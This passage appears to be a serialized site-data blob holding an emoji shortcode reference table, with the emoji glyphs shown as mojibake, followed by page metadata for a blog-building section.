:newspaper:                    ð :football:\nð :basketball:                       â½ï¸ :soccer:                       â¾ï¸ :baseball:\nð¾ :tennis:                           ð± :8ball:                        ð :rugby_football:\nð³ :bowling:                          â³ï¸ :golf:                         ðµ :mountain_bicyclist:\nð´ :bicyclist:                        ð :horse_racing:                 ð :snowboarder:\nð :swimmer:                          ð :surfer:                       ð¿ :ski:\nâ ï¸ :spades:                           â¥ï¸ :hearts:                       â£ï¸ :clubs:\nâ¦ï¸ :diamonds:                         ð :gem:                          ð :ring:\nð :trophy:                           ð¼ :musical_score:                ð¹ :musical_keyboard:\nð» :violin:                           ð¾ :space_invader:                ð® :video_game:\nð :black_joker:                      ð´ :flower_playing_cards:         ð² :game_die:\nð¯ :dart:                             ðï¸ :mahjong:                     ð¬ :clapper:\nð :memo:                             ð :pencil:                       ð :book:\nð¨ :art:                              ð¤ :microphone:                   ð§ :headphones:\nðº :trumpet:                          ð· :saxophone:                    ð¸ :guitar:\nð :shoe:                             ð¡ :sandal:                       ð  :high_heel:\nð :lipstick:                         ð¢ :boot:                         ð :shirt:\nð :tshirt:                           ð :necktie:                      ð :womans_clothes:\nð :dress:                            ð½ :running_shirt_with_sash:      ð :jeans:\nð :kimono:                           ð :bikini:                       ð :ribbon:\nð© :tophat:                           ð :crown:                        ð :womans_hat:\nð :mans_shoe:                        ð :closed_umbrella:              ð¼ :briefcase:\nð :handbag:                          ð :pouch:                        ð :purse:\nð :eyeglasses:                       ð£ :fishing_pole_and_fish:        âï¸ :coffee:\nðµ :tea:                              ð¶ :sake:                         ð¼ :baby_bottle:\nðº :beer:                             ð» :beers:                        ð¸ :cocktail:\nð¹ :tropical_drink:                   ð· :wine_glass:                   ð´ :fork_and_knife:\nð :pizza:                            ð :hamburger:                    ð :fries:\nð :poultry_leg:                      ð :meat_on_bone:                 ð :spaghetti:\nð :curry:                            ð¤ :fried_shrimp:                 ð± :bento:\nð£ :sushi:                            ð¥ :fish_cake:                    ð :rice_ball:\nð :rice_cracker:                     ð :rice:                         ð :ramen:\nð² :stew:                             ð¢ :oden:                         ð¡ :dango:\nð¥ :egg:                              ð :bread:                        ð© :doughnut:\nð® :custard:                          ð¦ :icecream:                     ð¨ :ice_cream:\nð§ :shaved_ice:                       ð :birthday:                     ð° :cake:\nðª :cookie:                           ð« :chocolate_bar:                ð¬ :candy:\nð­ :lollipop:                         ð¯ :honey_pot:                    ð :apple:\nð :green_apple:                      ð :tangerine:                    ð :lemon:\nð :cherries:                         ð :grapes:                       ð :watermelon:\nð :strawberry:                       ð :peach:                        ð :melon:\nð :banana:                           ð :pear:                         ð :pineapple:\nð  :sweet_potato:                     ð :eggplant:                     ð :tomato:\nð½ :corn:                                                               \n\n\n# Places\n\nð  :HOUSE:                 ð¡ :HOUSE_WITH_GARDEN:         ð« :SCHOOL:\nð¢ :office:                ð£ :post_office:               ð¥ :hospital:\nð¦ :bank:                  ðª :convenience_store:         ð© :love_hotel:\nð¨ :hotel:                 ð :wedding:                   âªï¸ :church:\nð¬ :department_store:      ð¤ :european_post_office:      ð :city_sunrise:\nð :city_sunset:           ð¯ :japanese_castle:           ð° :european_castle:\nâºï¸ :tent:                  ð­ :factory:                   ð¼ :tokyo_tower:\nð¾ :japan:                 ð» :mount_fuji:                ð :sunrise_over_mountains:\nð :sunrise:               ð  :stars:                     ð½ :statue_of_liberty:\nð :bridge_at_night:       ð  :carousel_horse:            ð :rainbow:\nð¡ :ferris_wheel:          â²ï¸ :fountain:                  ð¢ :roller_coaster:\nð¢ :ship:                  ð¤ :speedboat:                 âµï¸ :boat:\nâµï¸ :sailboat:              ð£ :rowboat:                   âï¸ :anchor:\nð :rocket:                âï¸ :airplane:                  ð :helicopter:\nð :steam_locomotive:      ð :tram:                      ð :mountain_railway:\nð² :bike:                  ð¡ :aerial_tramway:            ð :suspension_railway:\nð  :mountain_cableway:     ð :tractor:                   ð :blue_car:\nð :oncoming_automobile:   ð :car:                       ð :red_car:\nð :taxi:                  ð :oncoming_taxi:             ð :articulated_lorry:\nð :bus:                   ð :oncoming_bus:              ð¨ :rotating_light:\nð :police_car:            ð :oncoming_police_car:       ð :fire_engine:\nð :ambulance:             ð :minibus:                   ð :truck:\nð :train:                 ð :station:                   ð :train2:\nð :bullettrain_front:     ð :bullettrain_side:          ð :light_rail:\nð :monorail:              ð :railway_car:               ð :trolleybus:\nð« :ticket:                â½ï¸ :fuelpump:                  ð¦ :vertical_traffic_light:\nð¥ :traffic_light:         â ï¸ :warning:                   ð§ :construction:\nð° :beginner:              ð§ :atm:                       ð° :slot_machine:\nð :busstop:               ð :barber:                    â¨ï¸ :hotsprings:\nð :checkered_flag:        ð :crossed_flags:             ð® :izakaya_lantern:\nð¿ :moyai:                 ðª :circus_tent:               ð­ :performing_arts:\nð :round_pushpin:         ð© :triangular_flag_on_post:   ð¯ðµ :jp:\nð°ð· :kr:                  ð¨ð³ :cn:                      ðºð¸ :us:\nð«ð· :fr:                  ðªð¸ :es:                      ð®ð¹ :it:\nð·ðº :ru:                  ð¬ð§ :gb:                      ð¬ð§ :uk:\nð©ðª :de:                                                 \n\n\n# Symbols\n\n                                                                       \n1ï¸â£ :one:                             2ï¸â£ :two:                        3ï¸â£ :three:\n4ï¸â£ :four:                            5ï¸â£ :five:                       6ï¸â£ :six:\n7ï¸â£ :seven:                           8ï¸â£ :eight:                      9ï¸â£ :nine:\nð :keycap_ten:                       ð¢ :1234:                        0ï¸â£ :zero:\n#ï¸â£ :hash:                            ð£ :symbols:                     âï¸ :arrow_backward:\nâ¬ï¸ :arrow_down:                       â¶ï¸ :arrow_forward:               â¬ï¸ :arrow_left:\nð  :capital_abcd:                     ð¡ :abcd:                        ð¤ :abc:\nâï¸ :arrow_lower_left:                 âï¸ :arrow_lower_right:           â¡ï¸ :arrow_right:\nâ¬ï¸ :arrow_up:                         âï¸ :arrow_upper_left:            âï¸ :arrow_upper_right:\nâ¬ :arrow_double_down:                 â« :arrow_double_up:              ð½ :arrow_down_small:\nâ¤µï¸ :arrow_heading_down:               â¤´ï¸ :arrow_heading_up:            â©ï¸:leftwards_arrow_with_hook:\nâªï¸ :arrow_right_hook:                 âï¸ :left_right_arrow:            âï¸ :arrow_up_down:\nð¼ :arrow_up_small:                   ð :arrows_clockwise:            ð :arrows_counterclockwise:\nâª :rewind:                            â© :fast_forward:                 â¹ï¸ :information_source:\nð :ok:                               ð :twisted_rightwards_arrows:   ð :repeat:\nð :repeat_one:                       ð :new:                         ð :top:\nð :up:                               ð :cool:                        ð :free:\nð :ng:                               ð¦ :cinema:                      ð :koko:\nð¶ :signal_strength:                  ð¹ :u5272:                       ð´ :u5408:\nðº :u55b6:                            ð¯ï¸ :u6307:                      ð·ï¸ :u6708:\nð¶ :u6709:                            ðµ :u6e80:                       ðï¸ :u7121:\nð¸ :u7533:                            ð³ :u7a7a:                       ð² :u7981:\nðï¸ :sa:                              ð» :restroom:                    ð¹ :mens:\nðº :womens:                           ð¼ :baby_symbol:                 ð­ :no_smoking:\nð¿ï¸ :parking:                         â¿ï¸ :wheelchair:                  ð :metro:\nð :baggage_claim:                    ð :accept:                      ð¾ :wc:\nð° :potable_water:                    ð® :put_litter_in_its_place:     ãï¸ :secret:\nãï¸ :congratulations:                  âï¸ :m:                           ð :passport_control:\nð :left_luggage:                     ð :customs:                     ð :ideograph_advantage:\nð :cl:                               ð :sos:                         ð :id:\nð« :no_entry_sign:                    ð :underage:                    ðµ :no_mobile_phones:\nð¯ :do_not_litter:                    ð± :non-potable_water:           ð³ :no_bicycles:\nð· :no_pedestrians:                   ð¸ :children_crossing:           âï¸ :no_entry:\nâ³ï¸ :eight_spoked_asterisk:            â´ï¸ :eight_pointed_black_star:    ð :heart_decoration:\nð :vs:                               ð³ :vibration_mode:              ð´ :mobile_phone_off:\nð¹ :chart:                            ð± :currency_exchange:           âï¸ :aries:\nâï¸ :taurus:                           âï¸ :gemini:                      âï¸ :cancer:\nâï¸ :leo:                              âï¸ :virgo:                       âï¸ :libra:\nâï¸ :scorpius:                         âï¸ :sagittarius:                 âï¸ :capricorn:\nâï¸ :aquarius:                         âï¸ :pisces:                      â :ophiuchus:\nð¯ :six_pointed_star:                 â:negative_squared_cross_mark:   ð°ï¸ :a:\nð±ï¸ :b:                               ð :ab:                          ð¾ï¸ :o2:\nð :diamond_shape_with_a_dot_inside:   â»ï¸ :recycle:                     ð :end:\nð :on:                               ð :soon:                        ð :clock1:\nð :clock130:                         ð :clock10:                     ð¥ :clock1030:\nð :clock11:                          ð¦ :clock1130:                   ð :clock12:\nð§ :clock1230:                        ð :clock2:                      ð :clock230:\nð :clock3:                           ð :clock330:                    ð :clock4:\nð :clock430:                         ð :clock5:                      ð  :clock530:\nð :clock6:                           ð¡ :clock630:                    ð :clock7:\nð¢ :clock730:                         ð :clock8:                      ð£ :clock830:\nð :clock9:                           ð¤ :clock930:                    ð² :heavy_dollar_sign:\nÂ©ï¸ :copyright:                        Â®ï¸ :registered:                  â¢ï¸ :tm:\nâ :x:                                 âï¸ :heavy_exclamation_mark:      â¼ï¸ :bangbang:\nâï¸ :interrobang:                      â­ï¸ :o:                           âï¸ :heavy_multiplication_x:\nâ :heavy_plus_sign:                   â :heavy_minus_sign:             â :heavy_division_sign:\nð® :white_flower:                     ð¯ :100:                         âï¸ :heavy_check_mark:\nâï¸ :ballot_box_with_check:            ð :radio_button:                ð :link:\nâ° :curly_loop:                        ã°ï¸ :wavy_dash:                   ã½ï¸ :part_alternation_mark:\nð± :trident:                          âªï¸ :black_square:                ð³ :white_square:\nâ :white_check_mark:                  ð² :black_square_button:         â¬ï¸:black_large_square:\nâ«ï¸ :black_circle:                     âªï¸ :white_circle:                ð´ :red_circle:\nðµ :large_blue_circle:                ð· :large_blue_diamond:          ð¶ :large_orange_diamond:\nð¹ :small_blue_diamond:               ð¸ :small_orange_diamond:        ðº :small_red_triangle:\nð» :small_red_triangle_down:                                           ",normalizedContent:"# emojiè¡¨æ\n\n\n# emojiåç±»\n\n\n# people\n\nð± :scream:                         ð :smile:                          ð :laughing:\nð :blush:                          ð :smiley:                         âºï¸ :relaxed:\nð :smirk:                          ð :heart_eyes:                     ð :kissing_heart:\nð :kissing_closed_eyes:            ð³ :flushed:                        ð :relieved:\nð :satisfied:                      ð :grin:                           ð :wink:\nð :stuck_out_tongue_winking_eye:   ð :stuck_out_tongue_closed_eyes:   ð :grinning:\nð :kissing:                        ð :kissing_smiling_eyes:           ð :stuck_out_tongue:\nð´ :sleeping:                       ð :worried:                        ð¦ :frowning:\nð§ :anguished:                      ð® :open_mouth:                     ð¬ :grimacing:\nð :confused:                       ð¯ :hushed:                         ð :expressionless:\nð :unamused:                       ð :sweat_smile:                    ð :sweat:\nð¥ :disappointed_relieved:          ð© :weary:                          ð :pensive:\nð :disappointed:                   ð :confounded:                     ð¨ :fearful:\nð° :cold_sweat:                     ð£ :persevere:                      ð¢ :cry:\nð­ :sob:                            ð :joy:                            ð² :astonished:\nð :sunglasses:                     ðµ :dizzy_face:                     ð« :tired_face:\nð  :angry:                          ð¡ :rage:                           ð¤ :triumph:\nðª :sleepy:                         ð :yum:                            ð· :mask:\nð¿ :imp:                            ð :neutral_face:                   ð¶ :no_mouth:\n\n                                                               \nð :smiling_imp:                ð :innocent:                  ð½ :alien:\nð :innocent:                   ð§ :droplet:                   ð :yellow_heart:\nð :blue_heart:                 ð :purple_heart:              â¤ï¸ :heart:\nð :green_heart:                ð :broken_heart:              ð :heartbeat:\nð :heartpulse:                 ð :two_hearts:                ð :revolving_hearts:\nð :cupid:                      ð :sparkling_heart:           â¨ :sparkles:\nâ­ï¸ :star:                       ð :star2:                     ð« :dizzy:\nð¥ :boom:                       ð¥ :collision:                 ð¢ :anger:\nâï¸ :exclamation:                â :question:                   â :grey_exclamation:\nâ :grey_question:               ð¤ :zzz:                       ð¨ :dash:\nð¦ :sweat_drops:                ð¶ :notes:                     ðµ :musical_note:\nð¥ :fire:                       ð© :hankey:                    ð© :poop:\nð© :shit:                       ð :+1:                        ð :thumbsup:\nð :-1:                         ð :thumbsdown:                ð :ok_hand:\nð :punch:                      ð :facepunch:                 â :fist:\nâï¸ :v:                          ð :wave:                      â :hand:\nâ :raised_hand:                 ð :open_hands:                âï¸ :point_up:\nð :point_down:                 ð :point_left:                ð :point_right:\nð :raised_hands:               ð :pray:                      ð :point_up_2:\nð :clap:                       ðª :muscle:                    ð¤ :metal:\nð :fu:                         ð¶ :walking:                   ð :runner:\nð :running:                    ð« :couple:                    ðª :family:\nð¬ :two_men_holding_hands:      ð­ :two_women_holding_hands:   ð :dancer:\nð¯ :dancers:                    ð :ok_woman:                  ð :no_good:\nð :information_desk_person:    ð :raising_hand:              ð° :bride_with_veil:\nð :person_with_pouting_face:   ð :person_frowning:           ð :bow:\nð :couple_with_heart:          ð :massage:                   ð¥ :busts_in_silhouette:\nð :haircut:                    ð :nail_care:                 ð¦ :boy:\nð§ :girl:                       ð© :woman:                     ð¨ :man:\nð¶ :baby:                       ðµ :older_woman:               ð´ :older_man:\nð± :person_with_blond_hair:     ð² :man_with_gua_pi_mao:       ð³ :man_with_turban:\nð· :construction_worker:        ð® :cop:                       ð¼ :angel:\nð¸ :princess:                   ðº :smiley_cat:                ð¸ :smile_cat:\nð» :heart_eyes_cat:             ð½ :kissing_cat:               ð¼ :smirk_cat:\nð :scream_cat:                 ð¿ :crying_cat_face:           ð¹ :joy_cat:\nð¾ :pouting_cat:                ð¹ :japanese_ogre:             ðº :japanese_goblin:\nð :see_no_evil:                ð :hear_no_evil:              ð :speak_no_evil:\nð :guardsman:                  ð :skull:                     ð¾ :feet:\nð :lips:                       ð :kiss:                      ð¬ :speech_balloon:\nð :ear:                        ð :eyes:                      ð :nose:\nð :tongue:                     ð :love_letter:               ð¤ :bust_in_silhouette:\nð¥ :busts_in_silhouette:        ð­ :thought_balloon:           \n\n\n# nature\n\n                                                                \nâï¸ :sunny:                          âï¸ :umbrella:               âï¸ :cloud:\nâï¸ :snowflake:                      âï¸ :snowman:                â¡ï¸ :zap:\nð :cyclone:                        ð :foggy:                  ð :ocean:\nð± :cat:                            ð¶ :dog:                    ð­ :mouse:\nð¹ :hamster:                        ð° :rabbit:                 ðº :wolf:\nð¸ :frog:                           ð¯ :tiger:                  ð¨ :koala:\nð» :bear:                           ð· :pig:                    ð½ :pig_nose:\nð® :cow:                            ð :boar:                   ðµ :monkey_face:\nð :monkey:                         ð´ :horse:                  ð :racehorse:\nð« :camel:                          ð :sheep:                  ð :elephant:\nð¼ :panda_face:                     ð :snake:                  ð¦ :bird:\nð¤ :baby_chick:                     ð¥ :hatched_chick:          ð£ :hatching_chick:\nð :chicken:                        ð§ :penguin:                ð¢ :turtle:\nð :bug:                            ð :honeybee:               ð :ant:\nð :beetle:                         ð :snail:                  ð :octopus:\nð  :tropical_fish:                  ð :fish:                   ð³ :whale:\nð :whale2:                         ð¬ :dolphin:                ð :cow2:\nð :ram:                            ð :rat:                    ð :water_buffalo:\nð :tiger2:                         ð :rabbit2:                ð :dragon:\nð :goat:                           ð :rooster:                ð :dog2:\nð :pig2:                           ð :mouse2:                 ð :ox:\nð² :dragon_face:                    ð¡ :blowfish:               ð :crocodile:\nðª :dromedary_camel:                ð :leopard:                ð :cat2:\nð© :poodle:                         ð¾ :paw_prints:             ð :bouquet:\nð¸ :cherry_blossom:                 ð· :tulip:                  ð :four_leaf_clover:\nð¹ :rose:                           ð» :sunflower:              ðº :hibiscus:\nð :maple_leaf:                     ð :leaves:                 ð :fallen_leaf:\nð¿ :herb:                           ð :mushroom:               ðµ :cactus:\nð´ :palm_tree:                      ð² :evergreen_tree:         ð³ :deciduous_tree:\nð° :chestnut:                       ð± :seedling:               ð¼ :blossom:\nð¾ :ear_of_rice:                    ð :shell:                  ð :globe_with_meridians:\nð :sun_with_face:                  ð :full_moon_with_face:    ð :new_moon_with_face:\nð :new_moon:                       ð :waxing_crescent_moon:   ð :first_quarter_moon:\nð :waxing_gibbous_moon:            ð :full_moon:              ð :waning_gibbous_moon:\nð :last_quarter_moon:              ð :waning_crescent_moon:   ð :last_quarter_moon_with_face:\nð :first_quarter_moon_with_face:   ð :moon:                   ð :earth_africa:\nð :earth_americas:                 ð :earth_asia:             ð :volcano:\nð :milky_way:                      âï¸ :partly_sunny:           \n\n\n# objects\n\n                                                                        \nð :bamboo:                           ð :gift_heart:                   ð :dolls:\nð :school_satchel:                   ð :mortar_board:                 ð :flags:\nð :fireworks:                        ð :sparkler:                     ð :wind_chime:\nð :rice_scene:                       ð :jack_o_lantern:               ð» :ghost:\nð :santa:                            ð :christmas_tree:               ð :gift:\nð :bell:                             ð :no_bell:                      ð :tanabata_tree:\nð :tada:                             ð :confetti_ball:                ð :balloon:\nð® :crystal_ball:                     ð¿ :cd:                           ð :dvd:\nð¾ :floppy_disk:                      ð· :camera:                       ð¹ :video_camera:\nð¥ :movie_camera:                     ð» :computer:                     ðº :tv:\nð± :iphone:                           âï¸ :phone:                        âï¸ :telephone:\nð :telephone_receiver:               ð :pager:                        ð  :fax:\nð½ :minidisc:                         ð¼ :vhs:                          ð :sound:\nð :speaker:                          ð :mute:                         ð¢ :loudspeaker:\nð£ :mega:                             âï¸ :hourglass:                    â³ :hourglass_flowing_sand:\nâ° :alarm_clock:                       âï¸ :watch:                        ð» :radio:\nð¡ :satellite:                        â¿ :loop:                          ð :mag:\nð :mag_right:                        ð :unlock:                       ð :lock:\nð :lock_with_ink_pen:                ð :closed_lock_with_key:         ð :key:\nð¡ :bulb:                             ð¦ :flashlight:                   ð :high_brightness:\nð :low_brightness:                   ð :electric_plug:                ð :battery:\nð² :calling:                          âï¸ :email:                        ð« :mailbox:\nð® :postbox:                          ð :bath:                         ð :bathtub:\nð¿ :shower:                           ð½ :toilet:                       ð§ :wrench:\nð© :nut_and_bolt:                     ð¨ :hammer:                       ðº :seat:\nð° :moneybag:                         ð´ :yen:                          ðµ :dollar:\nð· :pound:                            ð¶ :euro:                         ð³ :credit_card:\nð¸ :money_with_wings:                 ð§ :e-mail:                       ð¥ :inbox_tray:\nð¤ :outbox_tray:                      âï¸ :envelope:                     ð¨ :incoming_envelope:\nð¯ :postal_horn:                      ðª :mailbox_closed:               ð¬ :mailbox_with_mail:\nð­ :mailbox_with_no_mail:             ðª :door:                         ð¬ :smoking:\nð£ :bomb:                             ð« :gun:                          ðª :hocho:\nð :pill:                             ð :syringe:                      ð :page_facing_up:\nð :page_with_curl:                   ð :bookmark_tabs:                ð :bar_chart:\nð :chart_with_upwards_trend:         ð :chart_with_downwards_trend:   ð :scroll:\nð :clipboard:                        ð :calendar:                     ð :date:\nð :card_index:                       ð :file_folder:                  ð :open_file_folder:\nâï¸ :scissors:                         ð :pushpin:                      ð :paperclip:\nâï¸ :black_nib:                        âï¸ :pencil2:                      ð :straight_ruler:\nð :triangular_ruler:                 ð :closed_book:                  ð :green_book:\nð :blue_book:                        ð :orange_book:                  ð :notebook:\nð :notebook_with_decorative_cover:   ð :ledger:                       ð :books:\nð :bookmark:                         ð :name_badge:                   ð¬ :microscope:\nð­ :telescope:                        ð° :newspaper:                    ð :football:\nð :basketball:                       â½ï¸ :soccer:                       â¾ï¸ :baseball:\nð¾ :tennis:                           ð± :8ball:                        ð :rugby_football:\nð³ :bowling:                          â³ï¸ :golf:                         ðµ :mountain_bicyclist:\nð´ :bicyclist:                        ð :horse_racing:                 ð :snowboarder:\nð :swimmer:                          ð :surfer:                       ð¿ :ski:\nâ ï¸ :spades:                           â¥ï¸ :hearts:                       â£ï¸ :clubs:\nâ¦ï¸ :diamonds:                         ð :gem:                          ð :ring:\nð :trophy:                           ð¼ :musical_score:                ð¹ :musical_keyboard:\nð» :violin:                           ð¾ :space_invader:                ð® :video_game:\nð :black_joker:                      ð´ :flower_playing_cards:         ð² :game_die:\nð¯ :dart:                             ðï¸ :mahjong:                     ð¬ :clapper:\nð :memo:                             ð :pencil:                       ð :book:\nð¨ :art:                              ð¤ :microphone:                   ð§ :headphones:\nðº :trumpet:                          ð· :saxophone:                    ð¸ :guitar:\nð :shoe:                             ð¡ :sandal:                       ð  :high_heel:\nð :lipstick:                         ð¢ :boot:                         ð :shirt:\nð :tshirt:                           ð :necktie:                      ð :womans_clothes:\nð :dress:                            ð½ :running_shirt_with_sash:      ð :jeans:\nð :kimono:                           ð :bikini:                       ð :ribbon:\nð© :tophat:                           ð :crown:                        ð :womans_hat:\nð :mans_shoe:                        ð :closed_umbrella:              ð¼ :briefcase:\nð :handbag:                          ð :pouch:                        ð :purse:\nð :eyeglasses:                       ð£ :fishing_pole_and_fish:        âï¸ :coffee:\nðµ :tea:                              ð¶ :sake:                         ð¼ :baby_bottle:\nðº :beer:                             ð» :beers:                        ð¸ :cocktail:\nð¹ :tropical_drink:                   ð· :wine_glass:                   ð´ :fork_and_knife:\nð :pizza:                            ð :hamburger:                    ð :fries:\nð :poultry_leg:                      ð :meat_on_bone:                 ð :spaghetti:\nð :curry:                            ð¤ :fried_shrimp:                 ð± :bento:\nð£ :sushi:                            ð¥ :fish_cake:                    ð :rice_ball:\nð :rice_cracker:                     ð :rice:                         ð :ramen:\nð² :stew:                             ð¢ :oden:                         ð¡ :dango:\nð¥ :egg:                              ð :bread:                        ð© :doughnut:\nð® :custard:                          ð¦ :icecream:                     ð¨ :ice_cream:\nð§ :shaved_ice:                       ð :birthday:                     ð° :cake:\nðª :cookie:                           ð« :chocolate_bar:                ð¬ :candy:\nð­ :lollipop:                         ð¯ :honey_pot:                    ð :apple:\nð :green_apple:                      ð :tangerine:                    ð :lemon:\nð :cherries:                         ð :grapes:                       ð :watermelon:\nð :strawberry:                       ð :peach:                        ð :melon:\nð :banana:                           ð :pear:                         ð :pineapple:\nð  :sweet_potato:                     ð :eggplant:                     ð :tomato:\nð½ :corn:                                                               \n\n\n# places\n\nð  :house:                 ð¡ :house_with_garden:         ð« :school:\nð¢ :office:                ð£ :post_office:               ð¥ :hospital:\nð¦ :bank:                  ðª :convenience_store:         ð© :love_hotel:\nð¨ :hotel:                 ð :wedding:                   âªï¸ :church:\nð¬ :department_store:      ð¤ :european_post_office:      ð :city_sunrise:\nð :city_sunset:           ð¯ :japanese_castle:           ð° :european_castle:\nâºï¸ :tent:                  ð­ :factory:                   ð¼ :tokyo_tower:\nð¾ :japan:                 ð» :mount_fuji:                ð :sunrise_over_mountains:\nð :sunrise:               ð  :stars:                     ð½ :statue_of_liberty:\nð :bridge_at_night:       ð  :carousel_horse:            ð :rainbow:\nð¡ :ferris_wheel:          â²ï¸ :fountain:                  ð¢ :roller_coaster:\nð¢ :ship:                  ð¤ :speedboat:                 âµï¸ :boat:\nâµï¸ :sailboat:              ð£ :rowboat:                   âï¸ :anchor:\nð :rocket:                âï¸ :airplane:                  ð :helicopter:\nð :steam_locomotive:      ð :tram:                      ð :mountain_railway:\nð² :bike:                  ð¡ :aerial_tramway:            ð :suspension_railway:\nð  :mountain_cableway:     ð :tractor:                   ð :blue_car:\nð :oncoming_automobile:   ð :car:                       ð :red_car:\nð :taxi:                  ð :oncoming_taxi:             ð :articulated_lorry:\nð :bus:                   ð :oncoming_bus:              ð¨ :rotating_light:\nð :police_car:            ð :oncoming_police_car:       ð :fire_engine:\nð :ambulance:             ð :minibus:                   ð :truck:\nð :train:                 ð :station:                   ð :train2:\nð :bullettrain_front:     ð :bullettrain_side:          ð :light_rail:\nð :monorail:              ð :railway_car:               ð :trolleybus:\nð« :ticket:                â½ï¸ :fuelpump:                  ð¦ :vertical_traffic_light:\nð¥ :traffic_light:         â ï¸ :warning:                   ð§ :construction:\nð° :beginner:              ð§ :atm:                       ð° :slot_machine:\nð :busstop:               ð :barber:                    â¨ï¸ :hotsprings:\nð :checkered_flag:        ð :crossed_flags:             ð® :izakaya_lantern:\nð¿ :moyai:                 ðª :circus_tent:               ð­ :performing_arts:\nð :round_pushpin:         ð© :triangular_flag_on_post:   ð¯ðµ :jp:\nð°ð· :kr:                  ð¨ð³ :cn:                      ðºð¸ :us:\nð«ð· :fr:                  ðªð¸ :es:                      ð®ð¹ :it:\nð·ðº :ru:                  ð¬ð§ :gb:                      ð¬ð§ :uk:\nð©ðª :de:                                                 \n\n\n# symbols\n\n                                                                       \n1ï¸â£ :one:                             2ï¸â£ :two:                        3ï¸â£ :three:\n4ï¸â£ :four:                            5ï¸â£ :five:                       6ï¸â£ :six:\n7ï¸â£ :seven:                           8ï¸â£ :eight:                      9ï¸â£ :nine:\nð :keycap_ten:                       ð¢ :1234:                        0ï¸â£ :zero:\n#ï¸â£ :hash:                            ð£ :symbols:                     âï¸ :arrow_backward:\nâ¬ï¸ :arrow_down:                       â¶ï¸ :arrow_forward:               â¬ï¸ :arrow_left:\nð  :capital_abcd:                     ð¡ :abcd:                        ð¤ :abc:\nâï¸ :arrow_lower_left:                 âï¸ :arrow_lower_right:           â¡ï¸ :arrow_right:\nâ¬ï¸ :arrow_up:                         âï¸ :arrow_upper_left:            âï¸ :arrow_upper_right:\nâ¬ :arrow_double_down:                 â« :arrow_double_up:              ð½ :arrow_down_small:\nâ¤µï¸ :arrow_heading_down:               â¤´ï¸ :arrow_heading_up:            â©ï¸:leftwards_arrow_with_hook:\nâªï¸ :arrow_right_hook:                 âï¸ :left_right_arrow:            âï¸ :arrow_up_down:\nð¼ :arrow_up_small:                   ð :arrows_clockwise:            ð :arrows_counterclockwise:\nâª :rewind:                            â© :fast_forward:                 â¹ï¸ :information_source:\nð :ok:                               ð :twisted_rightwards_arrows:   ð :repeat:\nð :repeat_one:                       ð :new:                         ð :top:\nð :up:                               ð :cool:                        ð :free:\nð :ng:                               ð¦ :cinema:                      ð :koko:\nð¶ :signal_strength:                  ð¹ :u5272:                       ð´ :u5408:\nðº :u55b6:                            ð¯ï¸ :u6307:                      ð·ï¸ :u6708:\nð¶ :u6709:                            ðµ :u6e80:                       ðï¸ :u7121:\nð¸ :u7533:                            ð³ :u7a7a:                       ð² :u7981:\nðï¸ :sa:                              ð» :restroom:                    ð¹ :mens:\nðº :womens:                           ð¼ :baby_symbol:                 ð­ :no_smoking:\nð¿ï¸ :parking:                         â¿ï¸ :wheelchair:                  ð :metro:\nð :baggage_claim:                    ð :accept:                      ð¾ :wc:\nð° :potable_water:                    ð® :put_litter_in_its_place:     ãï¸ :secret:\nãï¸ :congratulations:                  âï¸ :m:                           ð :passport_control:\nð :left_luggage:                     ð :customs:                     ð :ideograph_advantage:\nð :cl:                               ð :sos:                         ð :id:\nð« :no_entry_sign:                    ð :underage:                    ðµ :no_mobile_phones:\nð¯ :do_not_litter:                    ð± :non-potable_water:           ð³ :no_bicycles:\nð· :no_pedestrians:                   ð¸ :children_crossing:           âï¸ :no_entry:\nâ³ï¸ :eight_spoked_asterisk:            â´ï¸ :eight_pointed_black_star:    ð :heart_decoration:\nð :vs:                               ð³ :vibration_mode:              ð´ :mobile_phone_off:\nð¹ :chart:                            ð± :currency_exchange:           âï¸ :aries:\nâï¸ :taurus:                           âï¸ :gemini:                      âï¸ :cancer:\nâï¸ :leo:                              âï¸ :virgo:                       âï¸ :libra:\nâï¸ :scorpius:                         âï¸ :sagittarius:                 âï¸ :capricorn:\nâï¸ :aquarius:                         âï¸ :pisces:                      â :ophiuchus:\nð¯ :six_pointed_star:                 â:negative_squared_cross_mark:   ð°ï¸ :a:\nð±ï¸ :b:                               ð :ab:                          ð¾ï¸ :o2:\nð :diamond_shape_with_a_dot_inside:   â»ï¸ :recycle:                     ð :end:\nð :on:                               ð :soon:                        ð :clock1:\nð :clock130:                         ð :clock10:                     ð¥ :clock1030:\nð :clock11:                          ð¦ :clock1130:                   ð :clock12:\nð§ :clock1230:                        ð :clock2:                      ð :clock230:\nð :clock3:                           ð :clock330:                    ð :clock4:\nð :clock430:                         ð :clock5:                      ð  :clock530:\nð :clock6:                           ð¡ :clock630:                    ð :clock7:\nð¢ :clock730:                         ð :clock8:                      ð£ :clock830:\nð :clock9:                           ð¤ :clock930:                    ð² :heavy_dollar_sign:\nÂ©ï¸ :copyright:                        Â®ï¸ :registered:                  â¢ï¸ :tm:\nâ :x:                                 âï¸ :heavy_exclamation_mark:      â¼ï¸ :bangbang:\nâï¸ :interrobang:                      â­ï¸ :o:                           âï¸ :heavy_multiplication_x:\nâ :heavy_plus_sign:                   â :heavy_minus_sign:             â :heavy_division_sign:\nð® :white_flower:                     ð¯ :100:                         âï¸ :heavy_check_mark:\nâï¸ :ballot_box_with_check:            ð :radio_button:                ð :link:\nâ° :curly_loop:                        ã°ï¸ :wavy_dash:                   ã½ï¸ :part_alternation_mark:\nð± :trident:                          âªï¸ :black_square:                ð³ :white_square:\nâ :white_check_mark:                  ð² :black_square_button:         â¬ï¸:black_large_square:\nâ«ï¸ :black_circle:                     âªï¸ :white_circle:                ð´ :red_circle:\nðµ :large_blue_circle:                ð· :large_blue_diamond:          ð¶ :large_orange_diamond:\nð¹ :small_blue_diamond:               ð¸ :small_orange_diamond:        ðº :small_red_triangle:\nð» :small_red_triangle_down:                                           ",charsets:{cjk:!0},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"ç§å¯æç« æµè¯",frontmatter:{title:"ç§å¯æç« æµè¯",date:"2022-05-14T08:14:22.000Z",permalink:"/more/blog/privatepage",categories:["æ´å¤","åå®¢æ­å»º"],tags:[null],readingShow:"top"},regularPath:"/04.%E6%9B%B4%E5%A4%9A/400.%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/01.%E7%A7%81%E5%AF%86%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95.html",relativePath:"04.æ´å¤/400.åå®¢æ­å»º/01.ç§å¯æç« 